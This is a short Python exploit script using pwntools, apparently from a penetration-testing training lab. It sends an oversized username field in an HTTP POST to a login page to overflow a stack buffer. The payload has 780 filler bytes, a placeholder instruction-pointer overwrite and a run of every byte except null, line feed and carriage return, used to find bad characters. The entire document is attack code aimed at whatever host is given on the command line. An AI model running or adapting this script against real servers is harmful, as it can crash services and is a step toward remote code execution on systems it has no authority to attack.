#!/usr/bin/python
from pwn import *
import sys

def detectbadChar():
    char = ""
    badchars = [0x00, 0x0A, 0x0D]
    for i in range(0x1, 0x100):
        if i not in badchars:
            char+= chr(i)
    return char.encode()

try:      
    host = sys.argv[1]
    port = 80
    
    filler = b"A" * 780
    eip = b"B" * 4
 
    
    inputBuffer = filler + eip + b"C"*4 + detectbadChar()
    
    content = b"username=" + inputBuffer + b"&password=A"

    buffer = b"POST /login HTTP/1.1\r\n"
    buffer += b"Host: " + host.encode() + b"\r\n"
    buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101Firefox/52.0\r\n"
    buffer += b"Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer += b"Referer: http://10.11.0.22/login\r\n"
    buffer += b"Connection: close\r\n"
    buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += b"Content-Length: "+ str(len(content)).encode() + b"\r\n"
    buffer += b"\r\n"
    buffer += content

    print("Sending evil buffer...")
    r = remote(host, port)
    r.send(buffer)
    r.close()

    print("Done!")
    
    

except socket.error:
    print("Could not connect!")
